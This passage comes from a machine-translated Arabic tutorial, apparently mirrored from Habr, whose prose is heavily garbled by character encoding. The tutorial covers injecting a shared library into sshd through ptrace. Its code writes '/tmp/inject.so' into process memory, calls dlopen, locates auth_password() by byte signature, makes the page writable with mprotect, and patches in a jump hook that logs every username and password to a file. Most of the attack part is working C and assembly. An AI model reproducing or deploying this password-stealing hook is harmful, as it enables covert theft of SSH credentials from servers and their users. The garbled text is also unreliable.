class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  ูู ุฎูุงู ุงูููุงู ุจุฃูุจุฑ ูุฏุฑ ูููู ุฃุซูุงุก ุฅุนุฏุงุฏ ุงูุญูู ูุชุญููู ุงููุคุดุฑุงุช ุฅูู ุงููุณูุทุงุช ูุจุงุดุฑุฉ ูู ุงูุณุฌูุงุช ุ ูููููุง ุฃู ูุฌุนู ุฑูุฒ ุงูุญูู ุฃุณูู.  ุนูู ุณุจูู ุงููุซุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  ุฃู ุฃู ุฅุฏุฎุงู ุงูุดูุฑุฉ ุจุณูุท ููุบุงูุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  ุญุงู ุงูููุช ูุฅูุดุงุก ููุชุจุชูุง ุงูุฏููุงููููุฉ ุ ูุงูุชู ุณูุชู ุชุญููููุง ุจุฑูุฒ ุงูุญูู. <br><br>  ูุจู ุฃู ููุถู ูุฏููุง ุ ููุฑ ูู ุฃูุฑ ูุงุญุฏ ููู ุณูุชู ุงุณุชุฎุฏุงูู ... ูููุดุฆ ุงูููุชุจุฉ ุงูุฏููุงูููู. <br><br><h1 style=";text-align:right;direction:rtl">  ููุดุฆ ูู ููุชุจุงุช ุฏููุงููููุฉ </h1><br>  ูููู ููููุชุจุงุช ุงูุฏููุงููููุฉ ุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุนูุฏ ุงูุชุญููู.  ููููุงู ุจุฐูู ุ ูู ุจุชูููุฒ ุงูุฏุงูุงุช ุจุงุณุชุฎุฏุงู ูุญุฏุฉ ูู ุงูุชุฑููุฒ "__attribute __ ((ุงูููุดุฆ))".  ุนูู ุณุจูู ุงููุซุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  ููููู ุงููุณุฎ ุจุงุณุชุฎุฏุงู ุฃูุฑ ุจุณูุท: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  ุซู ุชุญูู ูู ุงูุฃุฏุงุก: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  ุนูุฏ ุชุญููู ุงูููุชุจุฉ ุ ุณูุชู ุงุณุชุฏุนุงุก ุงูููุดุฆ ุฃูุถูุง: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  ูุณุชุฎุฏู ูุฐู ุงููุธููุฉ ุฃูุถูุง ูุฌุนู ุญูุงุชูุง ุฃุณูู ุนูุฏ ุฅุฏุฎุงู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ูุณุงุญุฉ ุงูุนููุงู ูุนูููุฉ ุฃุฎุฑู. <br><br><h1 style=";text-align:right;direction:rtl">  ููุชุจุฉ ุฏููุงููููุฉ Sshd </h1><br>  ุงูุขู ุจุนุฏ ุฃู ุฃุชูุญุช ููุง ุงููุฑุตุฉ ูุชุญููู ููุชุจุชูุง ุงูุฏููุงููููุฉ ุ ูุญุชุงุฌ ุฅูู ุฅูุดุงุก ุฑูุฒ ุณูุบูุฑ ุณููู auth_password () ูู ููุช ุงูุชุดุบูู. <br><br>  ุนูุฏ ุชุญููู ููุชุจุชูุง ุงูุฏููุงููููุฉ ุ ูููููุง ุงูุนุซูุฑ ุนูู ุนููุงู ุจุฏุก sshd ุจุงุณุชุฎุฏุงู ููู "/ proc / self / Maps" ูู procfs.  ูุญู ูุจุญุซ ุนู ููุทูุฉ ุจูุง ุฃุฐููุงุช "rx" ุณูุจุญุซ ูููุง ุนู ุชุณูุณู ูุฑูุฏ ูู auth_password (): <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  ูุธุฑูุง ูุฃู ูุฏููุง ูุฌููุนุฉ ูู ุงูุนูุงููู ููุจุญุซ ุนููุง ุ ูุฅููุง ูุจุญุซ ุนู ูุธููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  ุนูุฏูุง ูุฌุฏ ุชุทุงุจููุง ุ ูุฌุจ ุนููู ุงุณุชุฎุฏุงู mprotect () ูุชุบููุฑ ุงูุฃุฐููุงุช ูู ููุทูุฉ ุงูุฐุงูุฑุฉ.  ูุฐุง ููู ูุฃู ููุทูุฉ ุงูุฐุงูุฑุฉ ูุงุจูุฉ ูููุฑุงุกุฉ ูุงูุชูููุฐ ุ ูุฃุฐููุงุช ุงููุชุงุจุฉ ูุทููุจุฉ ููุชุบููุฑุงุช ุฃุซูุงุก ุงูุชููู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  ุญุณููุง ุ ูุฏููุง ุงูุญู ูู ุงููุชุงุจุฉ ุฅูู ููุทูุฉ ุงูุฐุงูุฑุฉ ุงููุทููุจุฉ ุ ูุงูุขู ุญุงู ุงูููุช ูุฅุถุงูุฉ ููุทุฉ ุงูุทูุงู ุตุบูุฑุฉ ูู ุจุฏุงูุฉ ูุธููุฉ auth_password ุ ูุงูุชู ุณุชูุฑ ุจุงูุชุญูู ูู ุงูุฎุทุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  ูุฐุง ูุนุงุฏู ูุฐุง ุงูุฑูุฒ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  ุจุงูุทุจุน ุ ุงูุนููุงู 0x4142434445464748 ุบูุฑ ููุงุณุจ ููุง ูุณูุชู ุงุณุชุจุฏุงูู ุจุนููุงู ุฎุทุงูุชูุง: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  ุงูุขู ูููููุง ููุท ุฅุฏุฑุงุฌ ุงูุณุจูุฑุฉ ูู sshd.  ูุฌุนู ุงูุญูู ุฌูููุฉ ููุธููุฉ ุ ูู ุจุฅุฏุฑุงุฌ ููุญุฉ ุงูุงูุทูุงู ูู ุจุฏุงูุฉ ุงููุธููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  ุงูุขู ุนูููุง ุชูููุฐ ุฎุทุงู ููุชุนุงูู ูุน ุชุณุฌูู ุชูุฑูุฑ ุงูุจูุงูุงุช.  ูุฌุจ ุฃู ูุชุฃูุฏ ูู ุฃููุง ุญูุธูุง ุฌููุน ุงูุณุฌูุงุช ูุจู ุจุฏุก ุงูุฎุทุงู ูุงุณุชุนุงุฏุชูุง ูุจู ุงูุนูุฏุฉ ุฅูู ุงูููุฏ ุงูุฃุตูู: <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุฑูุฒ ูุตุฏุฑ ุฑุจุท</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  ุญุณููุง ุ ูุฐุง ูู ุดูุก ... ุจุทุฑููุฉ ... <br><br>  ูุณูุก ุงูุญุธ ุ ุจุนุฏ ูู ูุง ุชู ูุนูู ุ ูุฐุง ููุณ ูู ุดูุก.  ุญุชู ุฅุฐุง ูุดู ุฅุฏุฎุงู ุฑูุฒ sshd ุ ููุฏ ุชูุงุญุธ ุฃู ูููุงุช ูุฑูุฑ ุงููุณุชุฎุฏู ุงูุชู ุชุจุญุซ ุนููุง ูุง ุชุฒุงู ุบูุฑ ูุชุงุญุฉ.  ูุฐุง ูุฑุฌุน ุฅูู ุญูููุฉ ุฃู sshd ููู ุงุชุตุงู ูุฎูู ุทูููุง ุฌุฏูุฏูุง.  ุฅูู ุงูุทูู ุงูุฌุฏูุฏ ุงูุฐู ูุนุงูุฌ ุงูุงุชุตุงู ููุฌุจ ุฃู ูุถุน ุงูุฎุทุงู ููู. <br><br>  ููุชุฃูุฏ ูู ุฃููุง ูุนูู ูุน ุฃุทูุงู sshd ุ ูุฑุฑุช ูุญุต procfs ุจุญุซูุง ุนู ูููุงุช ุงูุฅุญุตุงุฆูุงุช ุงูุชู ุชุญุฏุฏ Parent PID sshd.  ุจูุฌุฑุฏ ุงูุนุซูุฑ ุนูู ูุฐู ุงูุนูููุฉ ุ ูุจุฏุฃ ุงูุญุงูู ูู ุฃุฌูู. <br><br>  ููุงู ูุฒุงูุง ูุฐูู.  ุฅุฐุง ุญุฏุซ ูู ุดูุก ุจุดูู ุฎุงุทุฆ ูุงูุฎูุถ ุญูู ุงูุฑูุฒ ูู SIGSEGV ุ ูุณูุชู ูุชู ุนูููุฉ ูุณุชุฎุฏู ูุงุญุฏ ููุท ุ ูููุณ ุนูููุฉ sshd ุงูุฃุตููุฉ.  ููุณ ูุฐุง ุฃูุจุฑ ุนุฒุงุก ุ ูููู ูู ุงููุงุถุญ ุฃูู ูุฌุนู ุชุตุญูุญ ุงูุฃุฎุทุงุก ุฃุณูู. <br><br><h1 style=";text-align:right;direction:rtl">  ุงูุญูู ูู ุงูุนูู </h1><br>  ุญุณููุง ุ ุฏุนูุง ูุฑู ุงูุนุฑุถ ุงูุชูุถูุญู: <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u="><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  ูููู ุงูุนุซูุฑ ุนูู ุงูุฑูุฒ ุงููุงูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุง</a> . <br><br>  ุขูู ุฃู ุชููู ูุฐู ุงูุฑุญูุฉ ูุฏ ุฃุนุทุงู ูุนูููุงุช ูุงููุฉ ูุฎุฏุงุน ููุณู. <br><br>  ุฃูุฏ ุฃู ุฃุดูุฑ ุงูุฃุดุฎุงุต ูุงูููุงูุน ุงูุชุงููุฉ ุงูุชู ุณุงุนุฏุช ูู ุงูุชุนุงูู ูุน ptrace: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุฌููุนุฉ ุฃุฏูุงุช ุญูู ุงูููุชุจุฉ ุงูุฏููุงููููุฉ Gaffe23</a> </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุนูู ุญูู EvilSocket ุงูุนุธูู</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar430302/">https://habr.com/ru/post/ar430302/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar430290/index.html">ูุญุงููุฉ ููุชูุจุค ุจุงูุชูุฑุงุฑ ุงูุฑุงุจุน ููุดุฑูุน SpaceX BFR</a></li>
<li><a href="../ar430292/index.html">ูุคุณุณุฉ ุงูุญุฏูุฏ ุงูุฅููุชุฑูููุฉ: ุฃุฏุงุก ุดุจูุฉ ููุญุฉ ุชุฑุฎูุต ุงูุดุฑุทุฉ ุงูุฃูุฑูููุฉ 0.5ูช</a></li>
<li><a href="../ar430294/index.html">10 ููุงุฆุฏ ุบูุฑ ูุงุถุญุฉ ูุงุณุชุฎุฏุงู ุงูุตุฏุฃ</a></li>
<li><a href="../ar430296/index.html">ุงุฌุนู ุฃููุงุฑู ุชุฃุชู ุงูุชุทุจูู. ุชุทุจูู ุจุฏูู ุฎุงุฏู - ุชุนูููุงุช ุฎุทูุฉ ุจุฎุทูุฉ</a></li>
<li><a href="../ar430300/index.html">Microservices on Go ูุน ูุฌููุนุฉ Go: ููุฏูุฉ</a></li>
<li><a href="../ar430304/index.html">ูููุน ุฑุงุฆุน ูู ุงููุฏุงุฑ</a></li>
<li><a href="../ar430306/index.html">ุงูููู ุงูุฃูู ูุดุฑูุฉ ูููุฉ ุญูุฑ ุจูุงุณุทุฉ ุฅููููุง ูุงุณู</a></li>
<li><a href="../ar430308/index.html">ุงูุซุนุจุงู ุงูุฏุงุฎูู. ุจูุถ ุนูุฏ ุงููุตุญ</a></li>
<li><a href="../ar430312/index.html">ุงูุชุญูู ูู ุงูุฃุดูุงู ุงููุนูุฏุฉ ููุชูุงุนู. ุงูุฌุฒุก ุงูุฃูู</a></li>
<li><a href="../ar430314/index.html">ุจูุช ุขุฎุฑ ุจุฑููุฉ ุฃู ุชูููุฐ ุจูุช ุงูููุงุนุฏุฉ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>